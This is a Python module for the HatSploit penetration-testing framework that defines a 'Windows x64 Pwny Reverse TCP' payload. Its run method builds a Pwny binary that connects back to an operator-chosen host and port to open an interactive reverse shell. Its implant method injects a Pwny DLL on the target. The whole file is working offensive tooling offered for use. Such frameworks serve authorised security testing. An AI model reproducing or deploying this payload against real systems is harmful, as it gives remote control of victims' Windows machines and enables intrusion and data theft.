
"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pwny import Pwny
from pwny.session import PwnySession

from hatsploit.lib.core.payload.basic import *
from hatsploit.lib.core.payload.windows.x64.bootstrap import Bootstrap


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "Windows x64 Pwny Reverse TCP",
            'Payload': "windows/x64/pwny_reverse_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': """
                This payload creates an interactive reverse Pwny shell for Windows
                with x64 architecture.
            """,
            'Arch': ARCH_X64,
            'Platform': OS_WINDOWS,
            'Session': PwnySession,
            'Type': REVERSE_TCP,
        })

    def implant(self):
        return Bootstrap().inject_dll(Pwny(
            target='x86_64-w64-mingw32',
        ).stat_binary('dll'))

    def run(self):
        return Pwny(
            target='x86_64-w64-mingw32',
            options={
                'uri': f'tcp://{self.rhost.value}:{str(self.rport.value)}'
            }
        ).to_binary()
